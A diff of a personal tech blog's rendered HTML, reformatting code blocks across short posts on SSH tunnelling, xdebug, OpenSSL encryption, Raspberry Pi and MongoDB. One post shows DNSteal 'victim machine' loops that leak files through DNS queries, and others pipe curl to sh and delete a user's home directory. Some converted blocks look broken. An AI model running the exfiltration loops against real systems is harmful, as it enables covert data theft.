@@ -103,24 +103,24 @@
 
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="On-the-victim-machine-you-simply-send-the-following-command"><a href="#On-the-victim-machine-you-simply-send-the-following-command" class="headerlink" title="On the victim machine, you simply send the following command:"></a>On the victim machine, you simply send the following command:</h3><pre class="brush: bash; title: ; notranslate" title="">for b in $(xxd -p file/to/send.png); do dig @server $b.filename.com; done
-</pre>
+        <h3 id="On-the-victim-machine-you-simply-send-the-following-command"><a href="#On-the-victim-machine-you-simply-send-the-following-command" class="headerlink" title="On the victim machine, you simply send the following command:"></a>On the victim machine, you simply send the following command:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> $(xxd -p file/to/send.png); <span class="keyword">do</span> dig @server <span class="variable">$b</span>.filename.com; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
 
 <p>Support for multiple files</p>
-<pre class="brush: bash; title: ; notranslate" title="">for filename in $(ls); do for b in $(xxd -p $f); do dig +short @server %b.$filename.com; done; done
-</pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> $(ls); <span class="keyword">do</span> <span class="keyword">for</span> b <span class="keyword">in</span> $(xxd -p <span class="variable">$f</span>); <span class="keyword">do</span> dig +short @server %b.<span class="variable">$filename</span>.com; <span class="keyword">done</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
 
 <p>It also supports gzip compression of the file to allow for faster transfer speeds, this can be achieved using the &#8220;-z&#8221; switch:</p>
-<pre class="brush: bash; title: ; notranslate" title="">python dnsteal.py 127.0.0.1 -z
-</pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dnsteal.py 127.0.0.1 -z</span><br></pre></td></tr></table></figure>
+
 
 <p>Then on the victim machine send a Gzipped file like so:</p>
-<pre class="brush: bash; title: ; notranslate" title="">for b in $(gzip -c file/to/send.png | xxd -p); do dig @server $b.filename.com; done
-</pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> $(gzip -c file/to/send.png | xxd -p); <span class="keyword">do</span> dig @server <span class="variable">$b</span>.filename.com; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
 
 <p>or for multiple, gzip compressed files:</p>
-<pre class="brush: bash; title: ; notranslate" title="">for filename in $(ls); do for b in $(gzip -c $filename | xxd -p); do dig +short @server %b.$filename.com; done; done
-</pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> $(ls); <span class="keyword">do</span> <span class="keyword">for</span> b <span class="keyword">in</span> $(gzip -c <span class="variable">$filename</span> | xxd -p); <span class="keyword">do</span> dig +short @server %b.<span class="variable">$filename</span>.com; <span class="keyword">done</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
       
     </div>
 
@@ -130,7 +130,7 @@
     
 
     <footer class="article-footer">
-      <a data-url="http://wirelessbox.net/2016/12/24/how-to-send-files-stealthily-to-a-remote-machine-using-dnsteal/" data-id="ckhhbad22000p98my2bzc8tv2" class="article-share-link">
+      <a data-url="http://wirelessbox.net/2016/12/24/how-to-send-files-stealthily-to-a-remote-machine-using-dnsteal/" data-id="ckhmph3i7000ph4y2610s3xch" class="article-share-link">
         <i class="fa fa-share"></i> Share
       </a>
       
@@ -170,14 +170,16 @@
 
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="local-port-to-remote-port"><a href="#local-port-to-remote-port" class="headerlink" title="local port to remote port"></a>local port to remote port</h3><pre class="brush: bash; title: ; notranslate" title="">$ ssh -L 9000:google.com:80 user@example.com
-</pre>
+        <h3 id="local-port-to-remote-port"><a href="#local-port-to-remote-port" class="headerlink" title="local port to remote port"></a>local port to remote port</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh -L 9000:google.com:80 user@example.com</span><br></pre></td></tr></table></figure>
 
 <p>this means forwarding our local port 9000 to imgur.com:80</p>
-<h3 id="remote-port-to-local-port"><a href="#remote-port-to-local-port" class="headerlink" title="remote port to local port"></a>remote port to local port</h3><pre class="brush: bash; title: ; notranslate" title="">$ ssh -R 9000:localhost:3000 user@example.com
-</pre>
+<h3 id="remote-port-to-local-port"><a href="#remote-port-to-local-port" class="headerlink" title="remote port to local port"></a>remote port to local port</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh -R 9000:localhost:3000 user@example.com</span><br></pre></td></tr></table></figure>
 
 <p>this means forwarding example.com server port 9000 to local 3000 port</p>
+<p>By default, OpenSSH only allows connecting to remote forwarded ports from the server host. However, the GatewayPorts option in the server configuration file sshd_config can be used to control this. The following alternatives are possible:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo vim /etc/ssh/sshd_config</span><br><span class="line">GatewayPorts yes</span><br><span class="line">sudo service sshd restart</span><br></pre></td></tr></table></figure>
+<p>This allows anyone to connect to the forwarded ports. If the server is on the public Internet, anyone on the Internet can connect to the port.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh -R 52.194.1.73:8080:localhost:80 host147.aws.example.com</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -188,7 +190,7 @@
     
 
     <footer class="article-footer">
-      <a data-url="http://wirelessbox.net/2016/12/24/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples/" data-id="ckhhbad22000q98mybr7uf165" class="article-share-link">
+      <a data-url="http://wirelessbox.net/2016/12/24/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples/" data-id="ckhmph3i7000qh4y299skbqmg" class="article-share-link">
         <i class="fa fa-share"></i> Share
       </a>
       
@@ -228,35 +230,14 @@
 
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="install-autoconf"><a href="#install-autoconf" class="headerlink" title="install autoconf"></a>install autoconf</h1><pre class="brush: bash; title: ; notranslate" title="">$ brew install autoconf
-</pre>
+        <h1 id="install-autoconf"><a href="#install-autoconf" class="headerlink" title="install autoconf"></a>install autoconf</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install autoconf</span><br></pre></td></tr></table></figure>
 
-<h3 id="install-debug"><a href="#install-debug" class="headerlink" title="install debug"></a>install debug</h3><pre class="brush: bash; title: ; notranslate" title="">wget http://xdebug.org/files/xdebug-2.5.3.tgz
-tar -xvzf xdebug-2.5.3.tgz
-cd xdebug-2.5.3
-phpize
-./configure --enable-xdebug --with-php-config=/Applications/XAMPP/xamppfiles/bin/php-config
-make
-modules_path=$(find /Applications/XAMPP/xamppfiles/lib/php/extensions -name "no-debug-non-zts*")
-echo $modules_path
-sudo cp modules/xdebug.so $modules_path
-</pre>
 
-<pre class="brush: bash; title: ; notranslate" title="">//Edit /Applications/XAMPP/xamppfiles/etc/php.ini
-//After zend_extension
-zend_extension=xdebug.so
-//add xdebug configure
-xdebug.remote_enable=1
-xdebug.remote_handler=dbgp
-xdebug.remote_host=localhost
-xdebug.remote_autostart = 1
-xdebug.remote_port=9000
-xdebug.show_local_vars=1
-xdebug.remote_log=/Applications/XAMPP/logs/xdebug.log
-//Optional – for development only
-//Find max_execution_time and set to unlimited:
-max_execution_time=0
-</pre>
+<h3 id="install-debug"><a href="#install-debug" class="headerlink" title="install debug"></a>install debug</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget http://xdebug.org/files/xdebug-2.5.3.tgz</span><br><span class="line">tar -xvzf xdebug-2.5.3.tgz</span><br><span class="line"><span class="built_in">cd</span> xdebug-2.5.3</span><br><span class="line">phpize</span><br><span class="line">./configure --enable-xdebug --with-php-config=/Applications/XAMPP/xamppfiles/bin/php-config</span><br><span class="line">make</span><br><span class="line">modules_path=$(find /Applications/XAMPP/xamppfiles/lib/php/extensions -name <span class="string">&quot;no-debug-non-zts*&quot;</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$modules_path</span></span><br><span class="line">sudo cp modules/xdebug.so <span class="variable">$modules_path</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//Edit /Applications/XAMPP/xamppfiles/etc/php.ini</span><br><span class="line">//After zend_extension</span><br><span class="line">zend_extension=xdebug.so</span><br><span class="line">//add xdebug configure</span><br><span class="line">xdebug.remote_enable=1</span><br><span class="line">xdebug.remote_handler=dbgp</span><br><span class="line">xdebug.remote_host=localhost</span><br><span class="line">xdebug.remote_autostart = 1</span><br><span class="line">xdebug.remote_port=9000</span><br><span class="line">xdebug.show_local_vars=1</span><br><span class="line">xdebug.remote_log=/Applications/XAMPP/logs/xdebug.log</span><br><span class="line">//Optional – <span class="keyword">for</span> development only</span><br><span class="line">//Find max_execution_time and <span class="built_in">set</span> to unlimited:</span><br><span class="line">max_execution_time=0</span><br></pre></td></tr></table></figure>
+
 
 <h3 id="Restart-Apache-using-XAMPP’s-manager-osx"><a href="#Restart-Apache-using-XAMPP’s-manager-osx" class="headerlink" title="Restart Apache using XAMPP’s manager-osx"></a>Restart Apache using XAMPP’s manager-osx</h3>
       
@@ -268,7 +249,7 @@ max_execution_time=0
     
 
     <footer class="article-footer">
-      <a data-url="http://wirelessbox.net/2016/12/24/xdebug-for-xampp-on-osx/" data-id="ckhhbad23000r98my6ff7cslp" class="article-share-link">
+      <a data-url="http://wirelessbox.net/2016/12/24/xdebug-for-xampp-on-osx/" data-id="ckhmph3i8000rh4y20wk7014f" class="article-share-link">
         <i class="fa fa-share"></i> Share
       </a>
       
@@ -314,25 +295,40 @@ max_execution_time=0
 <p>If you are set up to chat over OTR with them or to send them an encrypted e-mail, just use that to send your file. It&#8217;ll be faster. If you can call them, then call them and agree on a symmetric key. Then just use that key to encrypt the file like this. If you can&#8217;t (or don&#8217;t want to) do either of those, then you can follow this how-to.</p>
 <p>Step 0) Get their public key</p>
 <p>The other person needs to send you their public key in .pem format. If they only have it in rsa format (e.g., they use it for ssh), then have them do:</p>
-<pre class="brush: bash; title: ; notranslate" title="">openssl rsa -in id_rsa -outform pem &gt; id_rsa.pem
+<pre><code class="bash">openssl rsa -in id_rsa -outform pem &amp;gt; id_rsa.pem
 
-openssl rsa -in id_rsa -pubout -outform pem &gt; id_rsa.pub.pem</pre>
+openssl rsa -in id_rsa -pubout -outform pem &amp;gt; id_rsa.pub.pem```
 
-<p>Have them send you id_rsa.pub.pem</p>
-<p>Step 1) Generate a 256 bit (32 byte) random key</p>
-<pre class="brush: bash; title: ; notranslate" title="">openssl rand -base64 32 &gt; key.bin</pre>
 
-<p>Step 2) Encrypt the key</p>
-<pre class="brush: bash; title: ; notranslate" title="">openssl rsautl -encrypt -inkey id_rsa.pub.pem -pubin -in key.bin -out key.bin.enc</pre>
+Have them send you id_rsa.pub.pem
 
-<p>Step 3) Actually Encrypt our large file</p>
-<pre class="brush: bash; title: ; notranslate" title="">openssl enc -aes-256-cbc -salt -in SECRET_FILE -out SECRET_FILE.enc -pass file:./key.bin</pre>
+Step 1) Generate a 256 bit (32 byte) random key
 
-<p>Step 4) Send/Decrypt the files</p>
-<p>Send the .enc files to the other person and have them do:</p>
-<pre class="brush: bash; title: ; notranslate" title="">openssl rsautl -decrypt -inkey id_rsa.pem -in key.bin.enc -out key.bin
+```bash
+openssl rand -base64 32 &amp;gt; key.bin```
 
-openssl enc -d -aes-256-cbc -in SECRET_FILE.enc -out SECRET_FILE -pass file:./key.bin </pre>
+
+Step 2) Encrypt the key
+
+```bash
+openssl rsautl -encrypt -inkey id_rsa.pub.pem -pubin -in key.bin -out key.bin.enc```
+
+
+Step 3) Actually Encrypt our large file
+
+```bash
+openssl enc -aes-256-cbc -salt -in SECRET_FILE -out SECRET_FILE.enc -pass file:./key.bin```
+
+
+Step 4) Send/Decrypt the files
+
+Send the .enc files to the other person and have them do:
+
+```bash
+openssl rsautl -decrypt -inkey id_rsa.pem -in key.bin.enc -out key.bin
+
+openssl enc -d -aes-256-cbc -in SECRET_FILE.enc -out SECRET_FILE -pass file:./key.bin ```</code></pre>
+
       
     </div>
 
@@ -342,7 +338,7 @@ openssl enc -d -aes-256-cbc -in SECRET_FILE.enc -out SECRET_FILE -pass file:./ke
     
 
     <footer class="article-footer">
-      <a data-url="http://wirelessbox.net/2016/11/18/how-to-encrypt-a-big-file-using-openssl-and-someones-public-key/" data-id="ckhhbad21000o98mybc1c4x85" class="article-share-link">
+      <a data-url="http://wirelessbox.net/2016/11/18/how-to-encrypt-a-big-file-using-openssl-and-someones-public-key/" data-id="ckhmph3i4000lh4y2aaotgy9k" class="article-share-link">
         <i class="fa fa-share"></i> Share
       </a>
       
@@ -382,8 +378,9 @@ openssl enc -d -aes-256-cbc -in SECRET_FILE.enc -out SECRET_FILE -pass file:./ke
 
     <div class="article-entry" itemprop="articleBody">
       
-        <pre class="brush: bash; title: ; notranslate" title="">dscl localhost delete /Local/Default/Users/bobross
-rm -rf /Users/bobross</pre>
+        <pre><code class="bash">dscl localhost delete /Local/Default/Users/bobross
+rm -rf /Users/bobross```</code></pre>
+
       
     </div>
 
@@ -393,7 +390,7 @@ rm -rf /Users/bobross</pre>
     
 
     <footer class="article-footer">
-      <a data-url="http://wirelessbox.net/2016/11/18/delete-osx-account-on-command/" data-id="ckhhbad21000n98my9knf7kbe" class="article-share-link">
+      <a data-url="http://wirelessbox.net/2016/11/18/delete-osx-account-on-command/" data-id="ckhmph3i7000oh4y2b9hk17bw" class="article-share-link">
         <i class="fa fa-share"></i> Share
       </a>
       
@@ -434,27 +431,20 @@ rm -rf /Users/bobross</pre>
     <div class="article-entry" itemprop="articleBody">
       
         <p>###change ssh default keys</p>
-<pre class="brush: bash; title: ; notranslate" title="">rm /etc/ssh/ssh_host_*
-</pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /etc/ssh/ssh_host_*</span><br></pre></td></tr></table></figure>
+
 
 <p>###dpkg-reconfigure openssh-server</p>
-<pre class="brush: bash; title: ; notranslate" title="">service ssh restart
-</pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ssh restart</span><br></pre></td></tr></table></figure>
+
 
 <p>###config wifi</p>
-<pre class="brush: bash; title: ; notranslate" title="">vim /etc/network/interfaces
-auto wlan0
-iface wlan0 inet dhcp
-wpa-ssid “your network name”
-wpa-psk “the network password”
-//restart
-service networking restart
-</pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br><span class="line">auto wlan0</span><br><span class="line">iface wlan0 inet dhcp</span><br><span class="line">wpa-ssid “your network name”</span><br><span class="line">wpa-psk “the network password”</span><br><span class="line">//restart</span><br><span class="line">service networking restart</span><br></pre></td></tr></table></figure>
+
 
 <p>###list pci</p>
-<pre class="brush: bash; title: ; notranslate" title="">apt install pciutils
-lspci
-</pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install pciutils</span><br><span class="line">lspci</span><br></pre></td></tr></table></figure>
+
       
     </div>
 
@@ -464,7 +454,7 @@ lspci
     
 
     <footer class="article-footer">
-      <a data-url="http://wirelessbox.net/2016/11/02/raspberry-pi3-wifi-config/" data-id="ckhhbad1z000m98myfozef3u7" class="article-share-link">
+      <a data-url="http://wirelessbox.net/2016/11/02/raspberry-pi3-wifi-config/" data-id="ckhmph3i3000jh4y22j3366z0" class="article-share-link">
         <i class="fa fa-share"></i> Share
       </a>
       
@@ -504,15 +494,8 @@ lspci
 
     <div class="article-entry" itemprop="articleBody">
       
-        <pre class="brush: bash; title: ; notranslate" title="">ulimit -a
-open files                      (-n) 1024
-vim /etc/security/limits.conf
-//append
-* hard nofile 40960
-* soft nofile 40960
-vim /etc/profile
-ulimit -SHn 40960
-</pre>
+        <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -a</span><br><span class="line">open files                      (-n) 1024</span><br><span class="line">vim /etc/security/limits.conf</span><br><span class="line">//append</span><br><span class="line">* hard nofile 40960</span><br><span class="line">* soft nofile 40960</span><br><span class="line">vim /etc/profile</span><br><span class="line"><span class="built_in">ulimit</span> -SHn 40960</span><br></pre></td></tr></table></figure>
+
       
     </div>
 
@@ -522,7 +505,7 @@ ulimit -SHn 40960
     
 
     <footer class="article-footer">
-      <a data-url="http://wirelessbox.net/2016/10/31/ubuntu-max-ulimit/" data-id="ckhhbad1x000l98my5ynf4vf1" class="article-share-link">
+      <a data-url="http://wirelessbox.net/2016/10/31/ubuntu-max-ulimit/" data-id="ckhmph3i4000kh4y2ehxxbxry" class="article-share-link">
         <i class="fa fa-share"></i> Share
       </a>
       
@@ -562,15 +545,8 @@ ulimit -SHn 40960
 
     <div class="article-entry" itemprop="articleBody">
       
-        <pre class="brush: bash; title: ; notranslate" title="">1, Add Symbolic Breakpoint
-2, Enter UIApplicationMain into the Symbol field.
-3, Click the Add Action button, and ensure that Action is set to Debugger Command.
-4, Copy and paste the following text into the field below:
-expr (Class)NSClassFromString(@"IBARevealLoader") == nil ? (void *)dlopen("/Applications/Reveal.app/Contents/SharedSupport/iOS-Libraries/libReveal.dylib", 0x2) : ((void*)0)
+        <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1, Add Symbolic Breakpoint</span><br><span class="line">2, Enter UIApplicationMain into the Symbol field.</span><br><span class="line">3, Click the Add Action button, and ensure that Action is <span class="built_in">set</span> to Debugger Command.</span><br><span class="line">4, Copy and paste the following text into the field below:</span><br><span class="line">expr (Class)NSClassFromString(@<span class="string">&quot;IBARevealLoader&quot;</span>) == nil ? (void *)dlopen(<span class="string">&quot;/Applications/Reveal.app/Contents/SharedSupport/iOS-Libraries/libReveal.dylib&quot;</span>, 0x2) : ((void*)0)</span><br><span class="line"></span><br><span class="line">5, Check Automatically <span class="built_in">continue</span> after evaluating actions.</span><br><span class="line">6, Right click the newly created breakpoint and select Move Breakpoint To → User.</span><br></pre></td></tr></table></figure>
 
-5, Check Automatically continue after evaluating actions.
-6, Right click the newly created breakpoint and select Move Breakpoint To → User.
-</pre>
       
     </div>
 
@@ -580,7 +556,7 @@ expr (Class)NSClassFromString(@"IBARevealLoader") == nil ? (void *)dlopen("/Appl
     
 
     <footer class="article-footer">
-      <a data-url="http://wirelessbox.net/2016/10/24/reavealapp-dynamic-load/" data-id="ckhhbad1x000k98my8dsd38nm" class="article-share-link">
+      <a data-url="http://wirelessbox.net/2016/10/24/reavealapp-dynamic-load/" data-id="ckhmph3i6000nh4y28tbz1xyh" class="article-share-link">
         <i class="fa fa-share"></i> Share
       </a>
       
@@ -620,9 +596,8 @@ expr (Class)NSClassFromString(@"IBARevealLoader") == nil ? (void *)dlopen("/Appl
 
     <div class="article-entry" itemprop="articleBody">
       
-        <pre class="brush: bash; title: ; notranslate" title="">sudo codesign --remove-signature /Applications/Xcode.app/Contents/MacOS/Xcode 
-curl -fsSL https://raw.github.com/alcatraz/Alcatraz/master/Scripts/install.sh | sh
-</pre>
+        <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo codesign --remove-signature /Applications/Xcode.app/Contents/MacOS/Xcode </span><br><span class="line">curl -fsSL https://raw.github.com/alcatraz/Alcatraz/master/Scripts/install.sh | sh</span><br></pre></td></tr></table></figure>
+
       
     </div>
 
@@ -632,7 +607,7 @@ curl -fsSL https://raw.github.com/alcatraz/Alcatraz/master/Scripts/install.sh | 
     
 
     <footer class="article-footer">
-      <a data-url="http://wirelessbox.net/2016/10/22/alcatraz-install-xcode8/" data-id="ckhhbad1x000j98my6qq5h0dj" class="article-share-link">
+      <a data-url="http://wirelessbox.net/2016/10/22/alcatraz-install-xcode8/" data-id="ckhmph3i4000mh4y27f3g2ouw" class="article-share-link">
         <i class="fa fa-share"></i> Share
       </a>
       
@@ -672,15 +647,8 @@ curl -fsSL https://raw.github.com/alcatraz/Alcatraz/master/Scripts/install.sh | 
 
     <div class="article-entry" itemprop="articleBody">
       
-        <pre class="brush: bash; title: ; notranslate" title="">./mongorestore   --dir  ./dump/radacctinfo  --db radacctinfo
-./mongodump    --host 127.0.0.1  --db  local
-./mongo  mongodb://127.0.0.1
-sudo ./mongod  --dbpath  /data/db
-show dbs
-use local
-show tables
-db.radacctinfo.find().pretty()
-</pre>
+        <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./mongorestore   --dir  ./dump/radacctinfo  --db radacctinfo</span><br><span class="line">./mongodump    --host 127.0.0.1  --db  <span class="built_in">local</span></span><br><span class="line">./mongo  mongodb://127.0.0.1</span><br><span class="line">sudo ./mongod  --dbpath  /data/db</span><br><span class="line">show dbs</span><br><span class="line">use <span class="built_in">local</span></span><br><span class="line">show tables</span><br><span class="line">db.radacctinfo.find().pretty()</span><br></pre></td></tr></table></figure>
+
       
     </div>
 
@@ -690,7 +658,7 @@ db.radacctinfo.find().pretty()
     
 
     <footer class="article-footer">
-      <a data-url="http://wirelessbox.net/2016/10/15/mongodb-example-command/" data-id="ckhhbad1w000i98my3ki7alqm" class="article-share-link">
+      <a data-url="http://wirelessbox.net/2016/10/15/mongodb-example-command/" data-id="ckhmph3i3000ih4y21cyx5ojt" class="article-share-link">
         <i class="fa fa-share"></i> Share
       </a>
       
